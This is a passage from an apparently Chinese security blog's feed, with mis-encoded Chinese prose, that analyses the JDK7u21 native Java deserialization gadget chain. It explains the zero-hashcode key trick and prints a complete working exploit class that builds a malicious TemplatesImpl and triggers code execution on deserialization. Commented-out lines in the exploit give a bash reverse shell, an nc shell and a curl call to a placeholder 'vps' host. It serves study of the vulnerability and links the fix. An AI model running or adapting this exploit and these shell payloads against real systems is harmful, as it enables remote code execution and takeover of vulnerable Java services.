class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>useAltHashing<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>Hashing</span><span class="token punctuation">.</span><span class="token function">stringHash32</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        h <span class="token operator">=</span> hashSeed<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    h <span class="token operator">^=</span> k<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// This function ensures that hashCodes that differ only by</span>    <span class="token comment">// constant multiples at each bit position have a bounded</span>    <span class="token comment">// number of collisions (approximately 8 at default load factor).</span>    h <span class="token operator">^=</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> h <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é™¤äº† key.hashCode() å¤–å†æ²¡æœ‰å…¶ä»–å˜é‡ï¼Œæ‰€ä»¥ proxy å¯¹è±¡ä¸ TemplateImpl å¯¹è±¡çš„â€œå“ˆå¸Œâ€æ˜¯å¦ç›¸ç­‰ï¼Œä»…å–å†³äºè¿™ä¸¤ä¸ªå¯¹è±¡çš„ hashCode() æ˜¯å¦ç›¸ç­‰ã€‚</p><p>TemplateImpl çš„ hashCode() æ˜¯ä¸€ä¸ªNativeæ–¹æ³•ï¼Œæ¯æ¬¡è¿è¡Œéƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œç†è®ºä¸Šæ— æ³•é¢„æµ‹</p><p>åªèƒ½ä» proxy å¯¹è±¡å…¥æ‰‹ï¼Œproxy.hashCode() ä»ç„¶ä¼šè°ƒç”¨åˆ° <code>AnnotationInvocationHandler#invoke</code> ï¼Œè¿›è€Œè°ƒç”¨åˆ° <code>AnnotationInvocationHandler#hashCodeImpl</code> </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> var3 <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          var1 <span class="token operator">+=</span> <span class="token number">127</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">memberValueHashCode</span><span class="token punctuation">(</span>var3<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> var1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éå† memberValues è¿™ä¸ª Map ä¸­çš„æ¯ä¸ª key å’Œ valueï¼Œè®¡ç®—æ¯ä¸ª <code>(127 * key.hashCode()) ^ value.hashCode()</code> å¹¶æ±‚å’Œ</p><p>è€Œ jdk7u21 ä¸­çš„å¤„ç†ååˆ†å·§å¦™ï¼š</p><ul><li>å½“ memberValues ä¸­åªæœ‰ä¸€ä¸ª key å’Œä¸€ä¸ª value æ—¶ï¼Œè¯¥å“ˆå¸Œç®€åŒ–æˆ <code>(127 * key.hashCode()) ^ value.hashCode()</code></li><li>å½“ key.hashCode() ç­‰äº0æ—¶ï¼Œä»»ä½•æ•°å¼‚æˆ–0çš„ç»“æœä»æ˜¯ä»–æœ¬èº«ï¼Œæ‰€ä»¥è¯¥å“ˆå¸Œç®€åŒ–æˆ <code>value.hashCode()</code> ã€‚</li><li>å½“ value å°±æ˜¯ TemplateImpl å¯¹è±¡æ—¶ï¼Œè¿™ä¸¤ä¸ªå“ˆå¸Œå°±å˜æˆå®Œå…¨ç›¸ç­‰</li></ul><p>æ‰€ä»¥ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€ä¸ª <strong>hashCode æ˜¯ 0</strong> çš„å¯¹è±¡ä½œä¸º memberValues çš„ keyï¼Œå°†æ¶æ„ TemplateImpl å¯¹è±¡ä½œä¸º valueï¼Œè¿™ä¸ª proxy è®¡ç®—çš„ hashCode å°±ä¸ TemplateImpl å¯¹è±¡æœ¬èº«çš„ hashCode ç›¸ç­‰äº†</p><p>çˆ†ç ´å¯å¾—åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ä¸º <code>f5a5a608</code></p><hr><h1 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h1><p>expï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedHashSet</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> equalsImplChain <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> zeroHashCodeStr <span class="token operator">=</span> <span class="token string">"f5a5a608"</span><span class="token punctuation">;</span>            <span class="token comment">// å®ä¾‹åŒ–ä¸€ä¸ªmapï¼Œå¹¶æ·»åŠ Magic Numberä¸ºkeyï¼Œä¹Ÿå°±æ˜¯f5a5a608ï¼Œvalueå…ˆéšä¾¿è®¾ç½®ä¸€ä¸ªå€¼  </span>        <span class="token class-name">HashMap</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>zeroHashCodeStr<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// å®ä¾‹åŒ–AnnotationInvocationHandlerç±»  </span>        <span class="token class-name">Constructor</span> handlerConstructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          handlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">InvocationHandler</span> tempHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> handlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// ä¸ºtempHandleråˆ›é€ ä¸€å±‚ä»£ç†  </span>        <span class="token class-name">Templates</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>equalsImplChain<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> tempHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// å®ä¾‹åŒ–HashSetï¼Œå¹¶å°†ä¸¤ä¸ªå¯¹è±¡æ”¾è¿›å»  </span>        <span class="token class-name">HashSet</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//        HashMap&lt;Object, Object> objectObjectHashMap = new HashMap&lt;>();  </span><span class="token comment">//        objectObjectHashMap.put(tempHandler,"");  </span><span class="token comment">//        objectObjectHashMap.put(proxy,"");  </span>            <span class="token comment">// å°†æ¶æ„templatesè®¾ç½®åˆ°mapä¸­  </span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>zeroHashCodeStr<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>          oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span>          oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>          field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>          <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> plateform <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>command<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>plateform<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Windows"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  command <span class="token operator">=</span> <span class="token string">"calc.exe"</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>plateform<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Linux"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  command <span class="token operator">=</span> <span class="token string">"xcalc"</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>plateform<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Mac"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  command <span class="token operator">=</span> <span class="token string">"open -a Calculator"</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\""</span><span class="token operator">+</span>command<span class="token operator">+</span><span class="token string">"\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//        constructor.setBody("Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >&amp; /dev/tcp/vps/23333 0>&amp;1\");");  </span><span class="token comment">//        constructor.setBody("Runtime.getRuntime().exec(\"nc vps 23333 -e /bin/sh\");");  </span><span class="token comment">//        constructor.setBody("Runtime.getRuntime().exec(\"curl vps:23333\");");  </span>        ctClass<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//        return cleanBytecode(ctClass.toBytecode());  </span>        <span class="token keyword">return</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">TemplatesImpl</span> <span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>          <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> templates<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><p><a href="https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e">https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e</a></p><p><img src="/blog/2026/01/19/JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/IMG-20260120104216366.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ¯”è¾ƒè€çš„é“¾å­ï¼Œéšä¾¿è®°å½•ä¸€ä¸‹ç»†èŠ‚å§&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä¸€æ¡å®Œå…¨ä¸éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹åº“çš„é“¾å­ï¼Œåå¤„å°±æ˜¯ç‰ˆæœ¬å¤ªè€&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Y4tacker/JavaSec/blob/a6e0f8cc3a63622b768c3b46297c66dc8a0a85f0/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/JDK7u21/index.md&quot;&gt;https://github.com/Y4tacker/JavaSec/blob/a6e0f8cc3a63622b768c3b46297c66dc8a0a85f0/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/JDK7u21/index.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CISCN&amp;CCB2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/12/28/CISCN-CCB2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/12/28/CISCN-CCB2025/</id>
    <published>2025-12-28T02:41:56.000Z</published>
    <updated>2026-02-05T06:28:50.696Z</updated>
    
